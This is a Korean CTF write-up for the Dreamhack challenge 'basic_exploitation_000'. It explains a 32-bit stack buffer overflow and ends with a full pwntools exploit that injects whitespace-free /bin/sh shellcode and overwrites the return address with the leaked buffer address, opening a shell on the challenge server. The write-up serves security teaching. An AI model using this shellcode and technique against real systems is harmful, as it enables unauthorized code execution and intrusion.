## Concept

BOF(Buffer Overflow)는 프로그램이 버퍼에 데이터를 쓸 때 버퍼의 크기를 초과하여 인접한 메모리 영역을 덮어쓸 수 있는 취약점이다. C/C++ 계열 언어는 버퍼 크기를 자동으로 검증하지 않기 때문에, 입력값 길이를 제한하지 않으면 발생한다.

이 문제에서는 바이너리 내에 `get_shell()` 같은 함수가 존재하지 않기 때문에, 버퍼에 직접 셸코드를 삽입하고 Return Address를 버퍼의 시작 주소로 덮어써서 셸코드를 실행하는 방식을 사용한다.

### 발생 원인

`scanf("%s", ...)`, `gets()`, `strcpy()` 같은 함수는 입력 길이를 검사하지 않아 BOF의 주요 원인이 된다. 길이를 지정하더라도 (`%141s`) 버퍼 크기(0x80 = 128바이트)를 초과하는 값이면 동일하게 취약점이 발생한다.

### 메모리 구조와의 관계

스택 프레임은 아래와 같은 구조로 배치된다.

```
[ 낮은 주소 ]
+------------------+
|      buf[]       |  <-- 셸코드를 삽입할 버퍼
+------------------+
|    SFP (4byte)   |  <-- 저장된 베이스 포인터 (32비트)
+------------------+
|  Return Address  |  <-- buf의 시작 주소로 덮어씀
+------------------+
[ 높은 주소 ]
```

Return Address를 버퍼의 시작 주소로 덮어쓰면, 함수가 반환될 때 버퍼에 삽입해둔 셸코드부터 실행이 시작된다.

## 문제

`basic_exploitation_000` 문제는 BOF 취약점이 존재하는 서버에 셸코드를 주입하여 플래그를 획득하는 문제이다.

### 서비스 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x80];

    initialize();

    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}
```
{: file="basic_exploitation_000.c"}

`buf`는 0x80(=128)바이트로 선언되어 있고, `scanf("%141s", buf)`로 최대 141바이트까지 입력을 받는다. 128바이트를 초과하는 13바이트로 SFP(4바이트)와 Return Address(4바이트)를 덮어쓸 수 있어 BOF가 발생한다.

주목할 점은 `printf("buf = (%p)\n", buf)`로 **버퍼의 주소를 직접 출력**해준다는 것이다. ASLR이 적용된 환경에서도 실행마다 달라지는 buf의 주소를 런타임에 받아올 수 있으므로, 이를 Return Address로 사용하면 셸코드를 안정적으로 실행시킬 수 있다.

GDB로 `main`을 디스어셈블하면 `add esp, 0xffffff80`으로 스택에 0x80(=128)바이트가 할당되고, `lea eax, [ebp-0x80]`으로 버퍼의 시작 주소가 `scanf`의 인자로 넘어가는 것을 확인할 수 있다.

### 오프셋 계산

Return Address까지 덮어쓰기 위한 오프셋을 계산한다.

```
buf  = 0x80 (128바이트)
SFP  = 4바이트 (32비트 환경)
──────────────────────────
합계 = 132바이트  →  오프셋 = 132
```

셸코드를 버퍼 앞부분에 삽입하고, 나머지를 더미 데이터로 채운 뒤 Return Address 자리에 buf의 시작 주소를 넣는다.

```
[ 낮은 주소 ]
+---------------------------+
| shellcode (26byte)        |  <-- 실행할 셸코드
| "A" * (128 - 26)byte      |  <-- 나머지 buf 채우기
+---------------------------+
| "BBBB" (4byte)            |  <-- SFP 덮기
+---------------------------+
| p32(buf주소)  (4byte)     |  <-- Return Address → buf 시작 주소
+---------------------------+
[ 높은 주소 ]
```

### 익스플로잇

`scanf`는 공백 문자(`\x20`, `\x09`, `\x0a` 등)를 입력 구분자로 처리하기 때문에 일반적인 `/bin/sh` 셸코드를 그대로 사용할 수 없다. 공백 바이트를 포함하지 않는 `scanf` 전용 셸코드를 사용해야 한다.

```python
from pwn import *

p = remote("host3.dreamhack.games", 11074)

p.recvuntil(b"buf = ")
buf = eval(p.recvline())  # 서버가 출력한 buf 주소를 받아옴

# scanf용 셸코드 (공백 바이트 미포함)
shellcode = b'\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80'

payload  = shellcode                        # 셸코드 삽입
payload += b"A" * (0x80 - len(shellcode))   # buf 나머지 채우기
payload += b"BBBB"                          # SFP 덮기
payload += p32(buf)                         # Return Address → buf 시작 주소

p.sendline(payload)

p.interactive()
```
